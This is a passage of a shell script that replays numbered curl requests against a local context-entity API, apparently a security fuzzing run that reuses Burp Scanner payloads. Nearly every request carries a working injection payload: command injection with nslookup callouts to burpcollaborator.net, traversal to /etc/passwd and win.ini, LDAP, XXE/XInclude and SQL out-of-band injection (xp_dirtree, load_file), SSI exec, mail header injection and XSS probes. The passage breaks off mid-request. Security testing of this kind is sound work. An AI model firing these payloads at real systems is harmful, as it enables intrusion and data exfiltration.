(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "test456|nslookup -q=cname w96kfpv0zxx05sz4j8lkukuzlqrhh57t3hv4nsc.burpcollaborator.net.&",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "test",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 70"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "test456'\"\`0&nslookup -q=cname kwk82diomlkosgms6w88h8hn8ee54tuhr5jsbg0.burpcollaborator.net.&\`'",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "test",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 71"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "test456&nslookup -q=cname 0hiont347154dw78rcto2o23tuzlp9fxal28uwj.burpcollaborator.net.&'\\\"\`0&nslookup -q=cname 0hiont347154dw78rcto2o23tuzlp9fxal28uwj.burpcollaborator.net.&\`'",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "test",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 72"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "test456|echo n4cy34e3ob 2kvyolyyvy||a #' |echo n4cy34e3ob 2kvyolyyvy||a #|\" |echo n4cy34e3ob 2kvyolyyvy||a #",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "test",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 73"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "test456&echo 7m7uh6okkv f36lu9lrzc&",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "test",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 74"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "test456\"|echo tea6y1bfji 0diah44ab0 ||",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "test",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 75"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "test456'|echo tvnclcal6u q4ad4l9m6l #xzwx",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "test",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 76"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "test456|ping -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #' |ping -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #\\\" |ping -n 21 127.0.0.1",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "test",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 77"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "test456|ping -c 21 127.0.0.1||x",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "test",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 78"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "test456&ping -n 21 127.0.0.1&",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "test",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 79"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "test456'|ping -c 21 127.0.0.1 #",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "test",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 80"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "test456\"|ping -n 21 127.0.0.1 ||",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "test",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 81"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "test",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 82"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "c:\\windows\\win.ini",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "test",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 83"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "test456..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "test",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 84"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini\u0000test456",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "test",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 85"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/etc\/passwd",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "test",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 86"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "\/etc\/passwd",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "test",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 87"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "test456..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/etc\/passwd",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "test",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 88"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/..\/etc\/passwd\u0000test456",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "test",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 89"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "...\/test456",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "test",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 90"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": ".\/test456",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "test",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 91"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "l5dbu2j7do)(objectClass=*",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "test",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 92"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "y3gq9gf5kh)(!(objectClass=*)",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "test",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 93"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "vnwzzz2led)(!(!(objectClass=*))",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "test",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 94"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "*)(objectClass=*",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "test",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 95"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "*)(!(objectClass=*)",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "test",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 96"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "<ypu xmlns=\"http:\/\/a.b\/\" xmlns:xsi=\"http:\/\/www.w3.org\/2001\/XMLSchema-instance\" xsi:schemaLocation=\"http:\/\/a.b\/ http:\/\/nnebtg9rdobrjjdvxzzb8b8qzh58vwlkl8dv5ju.burpcollaborator.net\/ypu.xsd\">ypu<\/ypu>",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "test",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 97"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "<jyf xmlns:xi=\"http:\/\/www.w3.org\/2001\/XInclude\"><xi:include href=\"http:\/\/zjmnps539073fv97tbvn4n42vt1kr8hwika72vr.burpcollaborator.net\/foo\"\/><\/jyf>",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "test",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 98"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "test456]]>><",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "test",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 99"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "test456'+(function(){if(typeof nebia===\"undefined\"){var a=new Date();do{var b=new Date();}while(b-a<20000);nebia=1;}}())+'",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "test",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 100"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "\"-->'-->\`--><!--#set var=\"23v\" value=\"12up8uo5s2\"--><!--#set var=\"45x\" value=\"34wrawq7u4\"--><!--#echo var=\"23v\"--><!--#echo var=\"45x\"--><!--#exec cmd=\"nslookup -q=cname ophcvhbsfpdslkfwz01cacar1i79xxnlfj3bq3es.burpcollaborator.net\" -->",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "test",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 101"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "test456\r\nBCC:user@ntkbzgfrjohrpjjv3z5bebeq5hb81wrkjd75uxim.burpcollaborator.net\r\nsku: h",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "test",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 102"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "test456>\r\nBCC:user@fcv3i8yj2g0j8b2nmro3x3xio9u0koac26qydq1f.burpcollaborator.net\r\njcf: c",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "test",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 103"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "test456",
          "type": "(select extractvalue(xmltype('<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [ <!ENTITY % ykyvm SYSTEM \"http:\/\/f7n3d8tjxgvj3bxnhrj3s3sij9p0fo5c800ntbi.burpcollab'||'orator.net\/\">%ykyvm;]>'),'\/l') from dual)",
          "value": "1"
        }
      ],
      "name": "test",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 104"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "test456",
          "type": "test'||(select extractvalue(xmltype('<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [ <!ENTITY % ykyvm SYSTEM \"http:\/\/kh58nd3o7l5odg7srwt8282ntez5ptfhj5bs4gt.burpcollab'||'orator.net\/\">%ykyvm;]>'),'\/l') from dual)||'",
          "value": "1"
        }
      ],
      "name": "test",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 105"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "test456",
          "type": "test;declare @q varchar(99);set @q='\\\\6lsurz7ab79ah2bevixu6u69x03rtfj3atylle93.burpcollab'+'orator.net\\tnm'; exec master.dbo.xp_dirtree @q;-- ",
          "value": "1"
        }
      ],
      "name": "test",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 106"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "test456",
          "type": "test';declare @q varchar(99);set @q='\\\\3gkrmw276447cz6bqfsr1r16sxyooce05rtjgc41.burpcollab'+'orator.net\\ryd'; exec master.dbo.xp_dirtree @q;-- ",
          "value": "1"
        }
      ],
      "name": "test",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 107"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "test456",
          "type": "test');declare @q varchar(99);set @q='\\\\g6n4c9skwhuk2cwogsi4r4rjiao1ep4dv6jy6rug.burpcollab'+'orator.net\\tkq'; exec master.dbo.xp_dirtree @q;-- ",
          "value": "1"
        }
      ],
      "name": "test",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 108"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "test456",
          "type": "test'+(select load_file('\\\\\\\\sjfgpl5w9t7wfo90t4vg4g4vvm1dr1hp8swkjd72.burpcollaborator.net\\\\xqx'))+'",
          "value": "1"
        }
      ],
      "name": "test",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 109"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "test456",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "test\u0000alert(1)",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 110"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "test456",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "testconfirm%281%29",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 111"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "test456",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "test\u0000confirm(1)",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 112"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "test456",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "testprompt(1)",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 113"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "test456",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "testprompt%281%29",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 114"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "test456",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "test\u0000prompt(1)",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 115"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "test456",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "testdocument.location=1",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 116"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "test456",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "testdocument%2elocation%3d1",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 117"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "test456",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "test\u0000document.location=1",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 118"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "test456",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "testdocument.title=1",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 119"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "test456",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "testdocument%2etitle%3d1",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 120"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "test456",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "test\u0000document.title=1",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 121"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "test456",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "testa8wxs<a>c7j9g",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 122"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "test456",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "testa8wxs%3ca%3ec7j9g",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 123"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "test456",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "test\u0000a8wxs<a>c7j9g",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 124"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "test456",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "testyn8i2pbg7u><",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 125"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "test456",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "testyn8i2pbg7u%3e%3c",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 126"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "test456",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "test\u0000yn8i2pbg7u><",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 127"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "test456",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "alert(1)",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 128"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "test456",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "alert%281%29",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 129"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "test456",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "\u0000alert(1)",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 130"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "test456",
          "type": "test",
          "value": "1"
        }
      ],
      "name": "confirm(1)",
      "type": "test",
      "value": "test"
    }
  ]
}
EOF
sleep 1s

echo "* Request 131"
(curl localhost:9999/v1/contextEntities -s -S --header 'Content-Type: application/json' --header 'Accept: application/json' -d @- | python -mjson.tool) <<EOF
{
  "id": "testEntity1",
  "type": "testType",
  "attributes": [
    {
      "metadatas": [
        {
          "name": "test456",
          "type": "test",
